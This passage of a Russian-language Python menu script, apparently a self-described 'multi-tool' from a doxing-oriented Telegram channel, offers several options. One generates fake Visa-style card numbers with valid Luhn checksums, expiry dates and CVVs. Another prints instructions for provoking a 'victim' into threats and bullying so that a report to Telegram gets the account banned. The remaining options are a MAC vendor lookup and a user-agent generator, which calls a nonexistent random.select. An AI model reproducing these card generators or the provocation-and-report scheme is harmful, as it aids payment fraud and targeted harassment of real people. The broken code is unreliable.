        pystyle.Write.Print("[?] 1: Украина\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print("[?] 2: Россия\n", pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print("[?] 3: Казахстан\n", pystyle.Colors.white, interval=0.005)
        country_select = pystyle.Write.Input("\n[?] Ваш выбор: ", pystyle.Colors.white, interval=0.005)

        if country_select == "1":
            country = "Украина"
        elif country_select == "2":
            country = "Россия"
        elif country_select == "3":
            country = "Казахстан"
        else:
            pystyle.Write.Print("\n[!] Неправильный ввод.\n", pystyle.Colors.white, interval=0.005)

        def generate_card_number():
            bin_number = "4"  
            for _ in range(5):
                bin_number += str(random.randint(0, 9))

            account_number = ''.join(str(random.randint(0, 9)) for _ in range(9))
            card_number = bin_number + account_number
            checksum = generate_checksum(card_number)
            card_number += str(checksum)

            return card_number

        def generate_checksum(card_number):
            digits = [int(x) for x in card_number]
            odd_digits = digits[-2::-2]
            even_digits = digits[-1::-2]
            checksum = sum(odd_digits)
            for digit in even_digits:
                checksum += sum(divmod(digit * 2, 10))
            return (10 - checksum % 10) % 10

        def generate_expiry_date():
            month = random.randint(1, 12)
            year = random.randint(24, 30)  
            return "{:02d}/{:02d}".format(month, year)

        def generate_cvv():
            return ''.join(str(random.randint(0, 9)) for _ in range(3))

        def generate_random_card(country):
            card_number = generate_card_number()
            expiry_date = generate_expiry_date()
            cvv = generate_cvv()
            return {
                "Страна": country,
                "Номер карты": card_number,
                "Срок действия": expiry_date,
                "CVV": cvv
            }

        card = generate_random_card(country)
        pystyle.Write.Print("\n[+] Страна: " + card["Страна"], pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print("\n[+] Номер карты: " + card["Номер карты"], pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print("\n[+] Срок действия: " + card["Срок действия"], pystyle.Colors.white, interval=0.005)
        pystyle.Write.Print("\n[+] CVV: " + card["CVV"] + "\n", pystyle.Colors.white, interval=0.005)
    if select == "18":
        def mac_lookup(mac_address):
            api_url = f"https://api.macvendors.com/{mac_address}"
            try:
                response = requests.get(api_url)
                if response.status_code == 200:
                    return response.text.strip()
                else:
                    return f"Error: {response.status_code} - {response.text}"

            except Exception as e:
                return f"Error: {str(e)}"
        mac_address = pystyle.Write.Input("[?] Введите Mac-Address -> ", pystyle.Colors.white, interval = 0.005)  # Replace this with the MAC address you want to lookup
        vendor = mac_lookup(mac_address)
        pystyle.Write.Print(f"Vendor: {vendor}", pystyle.Colors.white, interval = 0.005)
    if select == "19":
        pystyle.Write.Print('''\nПровоцируем жертву на угрозы, оски, буллинг и тд. Дальше пишем на почту DMCA@telegram.org. В письме указывем скриншоты булинга, угроз и тд. "Здраствуйте, хочу подать жалобу на (юзер и айди типа). С уважением, пользователь" и все, главное скриншоты - доказательства.\n''', pystyle.Colors.white, interval = 0.005)
    if select == "20":
        num_agents = pystyle.Write.Input("\n[?] Введите кол-во User-agent -> ", pystyle.Colors.white, interval = 0.005)
        def generate_user_agents(num_agents):
            versions = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
            ]
            for _ in range(num_agents):
                version = random.randint(60, 90)
                year = random.randint(10, 21)
                month = random.randint(1, 12)
                
                user_agent = random.select(versions).format(version, year, year, month)
                pystyle.Write.Print("\n" + user_agent, pystyle.Colors.white, interval = 0.005)
        generate_user_agents(int(num_agents))
        print()
    if select == "21":
        pystyle.Write.Print("\n[+] [+] ТГК -> https://t.me/xexdoxbin\n[+] ИНФОРМАЦИЯ: ЛУЧШИЙ МУЛЬТИ-ИНСТРУМЕНТ ДЛЯ ИНФОРМАЦИОННОЙ БЕЗОПАСНОСТИ. ЗА ВАШИ ДЕЙСТВИЯ ОТВЕТСТВЕННОСТЬ НЕСЁТЕ ИСКЛЮЧИТЕЛЬНО ВЫ \n\n СПАСИБО, ЧТО ЦЕНИТЕ СТАРАНИЯ\n", pystyle.Colors.white, interval = 0.005)
    if select == "22":
        pystyle.Write.Print("\n[+] СОЗДАТЕЛЬ @xexcoding\n", pystyle.Colors.white, interval = 0.005)
    if select == "23":
        sure = pystyle.Write.Input("Вы действительно хотите выйти? \nY/N: ", pystyle.Colors.white, interval = 0.005)
        if sure.lower() == "y" or sure.lower() == "yes" or sure.lower() == "да" or sure.lower() == "lf":
            exit()
        else:
            continue
    pystyle.Write.Input("\n[?] Нажмите Enter для продолжения", pystyle.Colors.white, interval = 0.005)
    Main()
    
    
